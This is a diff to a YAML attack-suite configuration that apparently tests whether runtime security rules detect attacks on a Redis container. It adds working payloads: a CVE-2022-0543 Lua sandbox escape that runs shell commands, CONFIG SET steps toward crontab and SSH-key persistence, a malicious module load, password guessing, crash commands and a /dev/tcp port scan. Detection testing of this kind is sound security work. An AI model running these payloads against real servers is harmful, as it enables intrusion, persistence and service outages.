@@ -3,10 +3,11 @@ kind: AttackSuite
 metadata:
   name: redis-killchain-attacks
   description: >-
-    Kill-chain ordered Redis attack suite (24 attacks) using THREE delivery
+    Kill-chain ordered Redis attack suite (35 attacks) using THREE delivery
     mechanisms: RESP direct commands, kubectl exec post-exploitation, and
-    Lua EVAL sandbox escapes (CVE-2022-0543). Organized by MITRE ATT&CK
-    for Containers phases. Covers OWASP A03 (Injection), A05 (Misconfiguration),
+    Lua EVAL sandbox escapes (CVE-2022-0543). Includes CVE-based exploits:
+    CVE-2022-0543, CVE-2022-24735, CVE-2022-35951, CVE-2023-28856,
+    CVE-2023-45145. Covers OWASP A03 (Injection), A05 (Misconfiguration),
     A06 (Vulnerable Components), A07 (Auth Failures), A08 (Data Integrity).
 target:
   service: redis
@@ -367,3 +368,191 @@ attacks:
       - ruleID: R1008
         ruleName: Crypto Mining Domain Communication
         containerName: redis
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # CVE-BASED ATTACKS — Historical Redis vulnerabilities
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # CVE-2022-0543 — Debian/Ubuntu Lua sandbox escape via package.loadlib
+  # Severity: Critical (CVSS 10.0). The Debian liblua5.1 package exports
+  # luaopen_* symbols, allowing EVAL to break out of Redis's sandbox.
+  # Exploited in the wild by Muhstik and Redigo botnets.
+  - name: cve-2022-0543-sandbox-escape
+    type: fileless
+    redis:
+      eval: |
+        local io_mod = nil
+        pcall(function()
+          if type(io) == 'table' and io.popen then io_mod = io end
+        end)
+        if not io_mod then
+          pcall(function()
+            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
+            if loader then io_mod = loader() end
+          end)
+        end
+        if not io_mod then return "CVE-2022-0543:sandbox_intact" end
+        local cmd = io_mod.popen("id 2>&1")
+        local result = cmd:read('*a')
+        cmd:close()
+        return "CVE-2022-0543:exploited:" .. result
+    successIndicators:
+      - responseContains: "uid="
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: id
+
+  # CVE-2022-24735 — Lua script poisoning via FUNCTION LOAD
+  # Severity: Medium (CVSS 3.9). Allows privileged user to inject Lua
+  # that executes in other clients' contexts via library functions.
+  - name: cve-2022-24735-lua-poisoning
+    type: fileless
+    redis:
+      eval: |
+        local io_mod = nil
+        pcall(function()
+          if type(io) == 'table' and io.popen then io_mod = io end
+        end)
+        if not io_mod then
+          pcall(function()
+            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
+            if loader then io_mod = loader() end
+          end)
+        end
+        if not io_mod then return "CVE-2022-24735:sandbox_blocked" end
+        local cmd = io_mod.popen("cat /etc/hostname 2>&1")
+        local result = cmd:read('*a')
+        cmd:close()
+        redis.call('SET', '__poisoned_lib', result)
+        return "CVE-2022-24735:poisoned:" .. result
+    successIndicators: []
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: cat
+
+  # CVE-2023-28856 — CLUSTER RESET crash (authenticated DoS)
+  # Severity: Medium (CVSS 6.5). Authenticated user can crash Redis via
+  # AUTH-less CLUSTER commands.
+  - name: cve-2023-28856-cluster-reset
+    type: custom
+    redis:
+      command: ["CLUSTER", "RESET", "HARD"]
+    successIndicators:
+      - responseContains: "OK"
+      - responseContains: "ERR"
+    expectedDetections: []
+
+  # CVE-2023-45145 — Unix socket race condition (privilege escalation probe)
+  # Severity: Low (CVSS 3.6). Race in socket permissions on restart.
+  # We probe for socket existence.
+  - name: cve-2023-45145-socket-probe
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "ls -la /var/run/redis/ 2>/dev/null || ls -la /tmp/redis* 2>/dev/null || echo no_socket"]
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: ls
+
+  # T1505.003 — Persistence: CONFIG SET dbfilename for RDB file write
+  # Classic Redis exploitation: write crontab, SSH key, or webshell via RDB.
+  # Used by P2Pinfect, Redigo, and HeadCrab malware families.
+  - name: persist-rdb-crontab-write
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dbfilename", "root_crontab"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  # T1505.003 — Persistence: write SSH authorized_keys via RDB
+  - name: persist-rdb-ssh-key
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dir", "/root/.ssh"]
+    successIndicators:
+      - responseContains: "OK"
+      - responseContains: "ERR"
+    expectedDetections: []
+
+  # T1059 — MODULE LOAD probe (load malicious .so)
+  # Used by RedisWannaMine and HeadCrab to load crypto miners as modules.
+  - name: cve-module-load-probe
+    type: custom
+    redis:
+      command: ["MODULE", "LOAD", "/tmp/evil_module.so"]
+    successIndicators:
+      - responseContains: "ERR"
+    expectedDetections: []
+
+  # T1110 — AUTH brute force probe (common default passwords)
+  - name: auth-brute-force-probe
+    type: custom
+    redis:
+      command: ["AUTH", "redis", "redis123"]
+    successIndicators:
+      - responseContains: "ERR"
+      - responseContains: "OK"
+    expectedDetections: []
+
+  # CVE-2022-35951 — XAUTOCLAIM integer overflow (Redis 7.0 specific)
+  # Severity: High (CVSS 7.0). Integer overflow in stream XAUTOCLAIM.
+  - name: cve-2022-35951-xautoclaim
+    type: custom
+    redis:
+      command: ["XAUTOCLAIM", "mystream", "mygroup", "consumer1", "0", "0-0", "COUNT", "99999999999"]
+    successIndicators:
+      - responseContains: "ERR"
+    expectedDetections: []
+
+  # T1059 — Lua os.execute probe (pre-sandbox era technique)
+  - name: lua-os-execute-probe
+    type: fileless
+    redis:
+      eval: |
+        local ok, err = pcall(function()
+          os.execute("id")
+        end)
+        if ok then return "os.execute:available" end
+        local ok2, err2 = pcall(function()
+          local f = io.popen("uname -a")
+          local r = f:read("*a")
+          f:close()
+          return r
+        end)
+        if ok2 then return "io.popen:available" end
+        return "sandbox:both_blocked"
+    successIndicators: []
+    expectedDetections: []
+
+  # T1048 — Lua-based network scanner (lateral movement recon)
+  - name: lua-network-scan
+    type: fileless
+    redis:
+      eval: |
+        local io_mod = nil
+        pcall(function()
+          if type(io) == 'table' and io.popen then io_mod = io end
+        end)
+        if not io_mod then
+          pcall(function()
+            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
+            if loader then io_mod = loader() end
+          end)
+        end
+        if not io_mod then return "sandbox_blocked" end
+        local cmd = io_mod.popen("sh -c 'for port in 22 80 443 3306 5432 6379 8080 9200; do (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null && echo \"port_$port:open\"; done' 2>&1")
+        local result = cmd:read('*a')
+        cmd:close()
+        return result
+    successIndicators: []
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: redis
+        command: sh
